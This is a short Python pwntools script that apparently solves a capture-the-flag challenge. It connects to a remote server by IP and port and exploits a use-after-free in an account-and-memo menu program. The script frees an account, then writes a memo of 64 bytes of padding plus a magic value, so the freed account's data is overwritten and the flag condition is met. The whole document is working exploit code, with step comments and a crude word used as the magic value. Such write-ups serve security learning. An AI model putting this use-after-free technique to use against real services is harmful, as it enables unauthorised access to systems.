from pwn import *

p = remote('46.101.23.188',30472)
p.recv(1024)
p.sendline('1') #Creating new account
p.recv()
p.sendline('aaaa') # First Name
p.recv()
p.sendline('bbbb') # Second Name
p.recv(1024)
p.sendline('3') #Deleting the account (UAF vulnerability)
p.recv(1024)
p.sendline('4') #Adding memo to overwrite the main_account
payload = "A"*64 + "fuck" #Adding 64 byte padding and overwrting next 4 bytes with 0x6B637566 so that flag conditions meet
p.recv()
p.sendline(payload)
p.recv(1024)
p.sendline('5')
print(p.recv())
print(p.recv(1024))
